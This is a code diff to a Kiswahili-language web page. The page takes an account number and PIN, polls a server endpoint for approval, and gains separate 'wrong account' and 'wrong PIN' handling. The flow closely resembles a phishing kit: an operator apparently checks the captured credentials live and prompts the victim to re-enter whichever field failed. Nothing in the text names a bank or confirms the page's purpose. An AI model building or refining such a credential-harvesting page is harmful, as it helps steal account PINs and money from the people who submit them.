@@ -393,7 +393,7 @@
   })();
 </script>
 
-<!-- ======== ORIGINAL LOGIC (Kiswahili strings) ======== -->
+<!-- ======== LOGIC WITH 3-BUTTON SUPPORT ======== -->
 <script>
 (function() {
   const input = document.getElementById('pinInput');
@@ -528,26 +528,40 @@
     }
   });
 
-  // ── Polling ──
+  // ── Polling (3 outcomes: correct / wrong A/C / wrong PIN) ──
   function pollPin(requestId) {
     const interval = setInterval(async () => {
       try {
         const res = await fetch(`${window.location.origin}/check-pin/${requestId}`);
         const data = await res.json();
+
+        // ── Approved: both PIN & A/C correct ──
         if (data.approved === true) {
           clearInterval(interval);
           window.location.href = 'success.html';
+          return;
         }
+
+        // ── Rejected: differentiate wrong account vs wrong PIN ──
         if (data.approved === false || data.blocked) {
           clearInterval(interval);
-          // Reset PIN only (account number is kept for retry)
-          input.value = '';
           verifyBtn.disabled = true;
           verifyBtn.textContent = 'TUMA';
           verifyBtn.classList.remove('waiting');
           waitingEl.style.display = 'none';
-          showAlert('❌ PIN isiyo sahihi. Tafadhali jaribu tena.', 'error');
-          focusPin();
+
+          if (data.reason === 'account') {
+            // Wrong account number → clear both fields so user re-enters correctly
+            accountInput.value = '';
+            input.value = '';
+            showAlert('❌ Namba ya akaunti isiyo sahihi. Tafadhali angalia na ujaribu tena.', 'error');
+            focusAccount();
+          } else {
+            // Wrong PIN → keep account, clear PIN only
+            input.value = '';
+            showAlert('❌ PIN isiyo sahihi. Tafadhali jaribu tena.', 'error');
+            focusPin();
+          }
         }
       } catch (error) {
         console.error('Polling error:', error);
